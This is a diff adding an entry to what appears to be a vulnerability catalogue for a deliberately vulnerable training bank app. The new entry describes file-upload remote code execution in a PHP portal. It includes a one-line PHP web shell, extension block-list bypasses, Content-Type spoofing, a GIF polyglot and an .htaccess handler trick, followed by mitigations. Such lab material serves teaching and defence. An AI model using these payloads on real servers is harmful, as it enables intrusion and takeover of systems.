@@ -93,6 +93,7 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [62]  Software & Data Integrity — POST /admin/integrity/install accepts unsigned plugin code → RCE (Ch 35)
  [63]  Logging & Monitoring — failed logins and SSN-view actions are not audited; /admin/audit reachable by any logged-in user; CRLF log forgery via /forgot email (Ch 36)
  [64]  Client-side / modern frontend — no CSP, no SRI on jQuery/Bootstrap CDNs, postMessage/origin checks missing in cross-frame admin tooling (Ch 37)
+ [65]  File upload → RCE — NovaTrust Applications Center (PHP portal, :3010) (Ch 17)
  [65]  OS command injection — /admin/diagnostics ?host= → /bin/sh (Ch 12)
  [66]  XPath injection — /admin/directory ?name= over staff-directory.xml (Ch 12)
 
@@ -1319,6 +1320,50 @@ MITIGATION
   Use a parameterised/precompiled XPath that binds the value out of band
   (xpath.parse(expr).evaluate with a variable resolver), or strictly escape
   quotes. Better: stop storing secrets next to directory data.
+
+================================================================================
+ [65] File upload → RCE — NovaTrust Applications Center (PHP portal, :3010)
+================================================================================
+Base URL:   http://localhost:3010  (reached from the bank's "Apply" nav link
+            once signed in; own docker-compose service `applyportal`, PHP/Apache)
+Why RCE:    Apache runs .php AND .phtml/.pht/.php5/.phar, AllowOverride All,
+            Options +Indexes. Saved documents live under docs/<form>/ and the
+            folders directory-list. Five business forms, escalating filters:
+
+  loan.php      Personal Loan / pay stub      — NO validation.
+                Upload paystub.php = <?php $cmd=$_GET['cmd']; system($cmd); ?>
+                GET /docs/loan/paystub.php?cmd=id  -> uid=33(www-data)
+
+  card.php      Credit Card / photo ID        — extension BLOCK-LIST that omits
+                .phtml and .phar (Apache still runs them).
+                Upload id.phtml -> GET /docs/card/id.phtml?cmd=id -> RCE
+
+  mortgage.php  Mortgage / appraisal          — trusts the multipart part's
+                Content-Type ($_FILES[..]['type']).
+                filename=appraisal.php + Content-Type: image/png -> RCE
+
+  verify.php    Identity Verification / selfie — getimagesize() magic bytes +
+                block-list. Beat with a polyglot: bytes "GIF89a\n<?php ... ?>"
+                named selfie.phtml -> GET /docs/verify/selfie.phtml?cmd=id -> RCE
+
+  dispute.php   Dispute a Charge / receipt    — COMPLETE script block-list
+                (.phtml/.phar/.svg/.html all blocked) BUT AllowOverride All.
+                Upload 1  filename=.htaccess :
+                   <FilesMatch "receipt\.jpg$">
+                   SetHandler application/x-httpd-php
+                   </FilesMatch>
+                Upload 2  receipt.jpg = GIF89a polyglot web shell (jpg allowed).
+                GET /docs/dispute/receipt.jpg?cmd=id -> RCE (CVE-2018-9206 shape)
+
+TESTED (isolated container, no shell on host disk):
+  docker run --rm -i --network vuln-bank_default alpine sh
+  All five reach uid=33(www-data); naive attempts are blocked.
+
+MITIGATION
+  Store uploads outside the web root; serve as attachments with a fixed
+  Content-Type from a cookieless origin; random name + server-chosen extension
+  from a byte-level type check (re-encode images); AllowOverride None, remove
+  the PHP handler from the upload path; disable directory listing.
 
 ================================================================================
  Reproducibility note
